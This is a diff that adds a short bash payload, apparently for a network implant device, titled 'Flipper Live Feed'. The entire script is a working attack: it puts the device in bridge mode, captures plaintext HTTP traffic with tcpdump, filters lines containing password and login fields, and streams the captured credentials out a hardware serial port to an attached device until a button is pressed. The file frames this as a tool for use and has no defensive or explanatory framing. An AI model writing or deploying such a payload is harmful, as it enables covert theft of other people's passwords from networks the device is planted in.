@@ -1,0 +1,25 @@
+#!/bin/bash
+# Title:        Flipper Live Feed
+# Description:  Pipes plaintext credentials out the hardware serial port.
+# Net Mode:     BRIDGE
+
+function run_flipper_feed() {
+    NETMODE BRIDGE
+    sleep 5
+    LED SPECIAL
+
+    # Set Serial Port Baud Rate
+    stty -F /dev/ttyS0 115200
+
+    # Capture HTTP traffic, extract lines with passwords, pipe to Serial (ttyS0)
+    tcpdump -l -A -i br-lan tcp port 80 2>/dev/null | grep --line-buffered -iE 'pass=|pwd=|login=' > /dev/ttyS0 &
+    tpid=$!
+    
+    NO_LED=true BUTTON
+    kill $tpid
+    LED G SUCCESS
+}
+
+USB_WAIT
+run_flipper_feed &
+wait
